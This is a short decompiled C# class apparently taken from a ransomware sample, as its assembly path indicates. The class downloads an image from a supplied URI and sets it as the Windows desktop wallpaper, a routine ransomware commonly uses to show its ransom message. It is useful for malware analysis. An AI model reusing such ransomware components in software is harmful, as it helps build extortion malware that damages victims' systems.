// Decompiled with JetBrains decompiler
// Type: Complex.Wallpaper
// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10231E92-BCE6-4007-A463-67D77912E754
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-ec405cc32f21680a9328c4360bd6dc5b660af66209669ca815bebceefb6c3b39.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace Complex
{
  public sealed class Wallpaper
  {
    private const int SPI_SETDESKWALLPAPER = 20;
    private const int SPIF_UPDATEINIFILE = 1;
    private const int SPIF_SENDWININICHANGE = 2;

    private Wallpaper()
    {
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(
      int uAction,
      int uParam,
      string lpvParam,
      int fuWinIni);

    public static void Set(Uri uri)
    {
      try
      {
        Image image = Image.FromStream((Stream) null ?? new WebClient().OpenRead(uri.ToString()));
        string str = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
        image.Save(str, ImageFormat.Bmp);
        Wallpaper.SystemParametersInfo(20, 0, str, 3);
        Thread.Sleep(5000);
      }
      catch (Exception ex)
      {
      }
    }
  }
}
